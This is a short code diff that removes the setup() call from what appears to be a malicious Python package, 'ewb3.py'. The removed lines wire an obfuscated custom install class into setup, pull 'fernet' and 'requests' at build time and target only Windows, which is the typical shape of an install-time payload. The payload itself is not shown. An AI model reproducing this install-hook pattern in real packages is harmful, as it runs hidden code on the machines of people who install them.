@@ -18,22 +18,5 @@ class BdcEYKEsMJfOETEUpNzcgGSGtmbaBoHAMRjcetakbZUNJBDmznldNNfqwqpSAnpCAjGoUuinDH
             install.run(self)
 
 
-setup(
-    name="ewb3.py",
-    version=VERSION,
-    author="HBZLn",
-    author_email="ryZvnNqRVVIHrUhXAuL@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': BdcEYKEsMJfOETEUpNzcgGSGtmbaBoHAMRjcetakbZUNJBDmznldNNfqwqpSAnpCAjGoUuinDHIYVzZXJUzoijcMcbSHVMoZzJnJWSLUvlbRIBVQqMaKSZzkaMvRZbUJGDRojDYUWopIQcXRdTBsGvNhTJOWEipwDktQWCfXxfsbQvmaDbHVHKkNRLVqgzQbHmgrjktt,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
